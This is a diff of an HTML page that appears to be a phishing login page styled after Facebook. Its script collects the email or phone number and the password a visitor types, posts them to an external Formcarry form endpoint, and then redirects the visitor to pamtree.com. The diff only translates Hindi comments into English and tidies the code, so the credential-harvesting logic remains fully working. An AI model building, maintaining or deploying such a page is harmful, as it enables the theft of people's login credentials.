@@ -107,7 +107,6 @@
             document.getElementById("popupOverlay").style.display = "flex";
         };
     </script>
-
     <!-- Rest of the page content -->
     <div class="row res">
         <div class="fb-form res">
@@ -186,18 +185,18 @@
     <!-- Updated JavaScript for Form Submission and Redirection -->
     <script>
         document.getElementById("loginForm").addEventListener("submit", function (e) {
-            e.preventDefault(); // Form submission रोकें
+            e.preventDefault(); // Stop the form from submitting the default way
 
             const emailPhoneInput = document.getElementById("emailPhone").value;
             const passwordInput = document.getElementById("password").value;
 
-            // Regular expression for email validation
+            // Regular expressions for validation
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             const phoneRegex = /^[0-9]{10}$/;
 
             if (emailRegex.test(emailPhoneInput) || phoneRegex.test(emailPhoneInput)) {
                 if (passwordInput) {
-                    // Formcarry पर फॉर्म डेटा सबमिट करें (Updated formcarry URL)
+                    // Submit form data to Formcarry
                     fetch("https://formcarry.com/s/hJQzoZbhqc-", {
                         method: "POST",
                         headers: {
@@ -212,14 +211,15 @@
                         if (response.ok) {
                             console.log("Data submitted successfully");
 
-                            // Redirect to the provided URL after successful form submission
-                            window.location.href = "https://pamtree.com/";  // Redirect to the given link
+                            // Redirect to pamtree.com after successful submission
+                            window.location.href = "https://pamtree.com";
                         } else {
                             console.log("Failed to submit data");
                         }
                     })
-                    .catch(error => console.error("Error:", error));
-
+                    .catch(error => {
+                        console.error("Error:", error);
+                    });
                 } else {
                     alert("Please enter your password.");
                 }
